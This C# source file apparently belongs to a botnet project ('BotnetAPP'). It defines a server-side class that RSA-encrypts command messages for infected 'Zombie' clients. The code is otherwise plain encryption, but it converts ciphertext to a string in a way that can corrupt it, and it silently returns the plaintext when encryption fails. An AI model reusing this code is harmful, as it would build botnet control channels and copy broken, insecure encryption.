using System ;
using System.Linq;
using System.Security.Cryptography ;
using System.Text ;
using BotnetAPP.Shared ; 


namespace BotnetAPP.Network {

    /*
    Serverside 

    */  
    public class Encryption {

        private string _publickey ;


        private ASCIIEncoding _asen = new ASCIIEncoding();



        public Encryption() { }




        public string Encrypt(string message, Zombie zombie) {


            // Pour tester

           // message = "test" ; 
            try {

            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(8192);
            RSA.KeySize = 8192 ;


            RSA.FromXmlString(zombie.PublicKey) ;

            Console.WriteLine("La taille de la clé est de " + RSA.KeySize) ; 
            

            Console.WriteLine("le nb de byte est "+_asen.GetBytes(message).Count());

            message = Encoding.Default.GetString(RSA.Encrypt(_asen.GetBytes(message), false)) ;


            Console.WriteLine(message) ; 

            } catch (Exception e) {

              //  Console.WriteLine("Longueur de la clé : " + RSA.KeySize);
                Console.WriteLine(message) ; 
                Console.WriteLine(e.Message) ; 
            }




            
            return message ; 
        }

    }
}
